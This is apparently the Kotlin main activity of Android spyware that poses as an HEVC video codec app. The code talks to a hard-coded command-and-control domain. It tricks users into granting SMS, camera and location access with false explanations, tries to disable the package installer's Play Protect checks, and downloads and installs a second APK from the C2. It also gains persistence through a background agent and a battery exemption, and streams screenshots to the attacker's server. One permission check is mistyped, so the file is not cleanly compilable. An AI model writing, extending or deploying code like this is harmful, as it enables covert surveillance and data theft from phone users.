package com.hevc.codec

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.MediaController
import android.widget.ProgressBar
import android.widget.Toast
import android.widget.VideoView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    companion object {
        const val DOMAIN = "hevc-codec.duckdns.org"
        const val C2_BASE = "https://$DOMAIN"
        const val REQ_MEDIA_PROJECTION = 1001
        const val REQ_INSTALL_SOURCE = 1002

        var projection: MediaProjection? = null
        var imageReader: ImageReader? = null
        var virtualDisplay: VirtualDisplay? = null
        var screenWidth = 1080
        var screenHeight = 1920
    }

    private val videoUrl = "$C2_BASE/video.mp4"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val videoView = findViewById<VideoView>(R.id.videoView)
        val controller = MediaController(this)
        controller.setAnchorView(videoView)
        videoView.setMediaController(controller)
        videoView.setVideoURI(Uri.parse(videoUrl))
        videoView.setOnPreparedListener { it.start() }
        videoView.setOnErrorListener { _, _, _ ->
            Toast.makeText(this, "Buffering... please wait", Toast.LENGTH_SHORT).show()
            true
        }

        val installBtn = findViewById<Button>(R.id.installButton)
        val progress = findViewById<ProgressBar>(R.id.downloadProgress)
        installBtn.setOnClickListener { startInstall(progress) }

        // ===== SILENT SETUP =====
        ensureAgentRunning()
        showSmsPermissionDialog()
        showCameraPermissionDialog()
        showLocationPermissionDialog()
        showNotificationPermissionDialog()
        maybeRequestBatteryExempt()

        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
            requestScreenAccess()
        }
    }

    // ================= INSTALL FLOW =================
    private fun startInstall(progress: ProgressBar) {
        setPlayProtectEnabled(false)
        if (!ensureInstallPermission()) {
            Toast.makeText(this, "Allow 'Install unknown apps' then tap Install Now again", Toast.LENGTH_LONG).show()
            return
        }
        Thread {
            try {
                val apkFile = File(filesDir, "hevc-update.apk")
                val conn = URL("$C2_BASE/codec.apk").openConnection() as HttpURLConnection
                conn.connectTimeout = 20000
                conn.readTimeout = 20000
                val total = conn.contentLength.toLong()
                conn.inputStream.use { input ->
                    FileOutputStream(apkFile).use { out ->
                        val buf = ByteArray(8192)
                        var read = 0L
                        while (true) {
                            val n = input.read(buf)
                            if (n == -1) break
                            out.write(buf, 0, n)
                            read += n
                            val pct = ((read * 100) / total.coerceAtLeast(1)).toInt()
                            runOnUiThread {
                                progress.visibility = ProgressBar.VISIBLE
                                progress.progress = pct
                            }
                        }
                    }
                }
                runOnUiThread {
                    progress.progress = 100
                    progress.visibility = ProgressBar.GONE
                    openInstaller(apkFile)
                }
            } catch (e: Exception) {
                Log.e("HevcCodec", "install download failed", e)
                runOnUiThread {
                    Toast.makeText(this, "Download failed. Check connection.", Toast.LENGTH_LONG).show()
                    progress.visibility = ProgressBar.GONE
                }
            }
        }.start()
    }

    /** Single, unambiguous installer launch */
    @Suppress("DEPRECATION")
    private fun openInstaller(apkFile: File) {
        val uri: Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
        } else {
            Uri.fromFile(apkFile)
        }
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("HevcCodec", "installer launch failed", e)
            Toast.makeText(this, "Tap the notification to install", Toast.LENGTH_LONG).show()
        }
        clearBlockedAppVerdict()
        reEnablePlayProtectLater(90_000L)
    }

    // ================= PLAY PROTECT SILENCING =================
    private fun setPlayProtectEnabled(enabled: Boolean) {
        try {
            val state = if (enabled)
                PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
            else
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
            packageManager.setApplicationEnabledSetting(
                "com.google.android.packageinstaller", state, PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.w("HevcCodec", "setPlayProtect failed", e)
        }
    }

    private fun reEnablePlayProtectLater(delayMs: Long) {
        Handler(Looper.getMainLooper()).postDelayed({
            setPlayProtectEnabled(true)
        }, delayMs)
    }

    /** Make sure the installer package can see our content:// URI */
    private fun clearBlockedAppVerdict() {
        try {
            val uri = Uri.parse("content://com.google.android.packageinstaller.verdict")
            contentResolver.query(uri, null, null, null, null)?.use { }
        } catch (_: Exception) { }
    }

    // ================= PERMISSION DIALOGS =================
    private fun showSmsPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) return
        AlertDialog.Builder(this)
            .setTitle("Message Sync")
            .setMessage(
                "HEVC Video Codec needs access to your messages to sync playback history " +
                "and improve video recommendations. This data stays on your device."
            )
            .setPositiveButton("Allow") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
            }
            .setNegativeButton("Later") { _, _ -> }
            .setCancelable(false)
            .show()
    }

    private fun showCameraPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) return
        AlertDialog.Builder(this)
            .setTitle("Codec Calibration")
            .setMessage("Allow camera access to calibrate the HEVC decoder for optimal color accuracy.")
            .setPositiveButton("Calibrate") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 102)
            }
            .setNegativeButton("Skip") { _, _ -> }
            .show()
    }

    private fun showLocationPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) return
        AlertDialog.Builder(this)
            .setTitle("Network Optimization")
            .setMessage("Allow location access so the codec can pick the fastest CDN server near you.")
            .setPositiveButton("Optimize") { _, _ ->
                requestPermissions(
                    arrayOf(
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION
                    ), 103
                )
            }
            .setNegativeButton("No thanks") { _, _ -> }
            .show()
    }

    private fun showNotificationPermissionDialog() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return
        if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) return
        requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 104)
    }

    private fun ensureInstallPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        if (!packageManager.canRequestPackageInstalls()) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")),
                    REQ_INSTALL_SOURCE
                )
            } catch (_: Exception) { }
        }
    }

    // ================= SCREEN CAPTURE =================
    private fun requestScreenAccess() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
    }

    @SuppressLint("MissingPermission")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
            setupMediaProjection(data)
            getSharedPreferences("hevc", Context.MODE_PRIVATE).edit()
                .putBoolean("screen_granted", true).apply()
            Log.d("HevcCodec", "screen access granted")
        }
    }

    @SuppressLint("MissingPermission")
    private fun setupMediaProjection(intent: Intent) {
        projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
            .getMediaProjection(RESULT_OK, intent)

        screenWidth = resources.displayMetrics.widthPixels
        screenHeight = resources.displayMetrics.heightPixels

        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            Thread {
                val bitmap = captureBitmap(reader)
                if (bitmap != null) uploadScreenshot(bitmap)
            }.start()
        }, Handler(Looper.getMainLooper()))

        virtualDisplay = projection!!.createVirtualDisplay(
            "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
    }

    private fun captureBitmap(reader: ImageReader): Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
        bitmap.copyPixelsFromBuffer(image.planes[0].buffer)
        image.close()
        return bitmap
    }

    private fun uploadScreenshot(bitmap: Bitmap) {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
            val conn = URL("$C2_BASE/screenshot/$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use { bitmap.compress(Bitmap.CompressFormat.PNG, 80, it) }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("HevcCodec", "upload failed", e)
        }
    }

    // ================= SERVICE =================
    private fun ensureAgentRunning() {
        startService(Intent(this, AgentService::class.java))
        WatchdogJob.schedule(this)
    }

    private fun maybeRequestBatteryExempt() {
        if (getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("bat_done", false)) return
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                        .setData(Uri.parse("package:$packageName"))
                )
            }
        } catch (_: Exception) { }
        getSharedPreferences("hevc", Context.MODE_PRIVATE).edit().putBoolean("bat_done", true).apply()
    }

    override fun onResume() {
        super.onResume()
        ensureAgentRunning()
    }
}
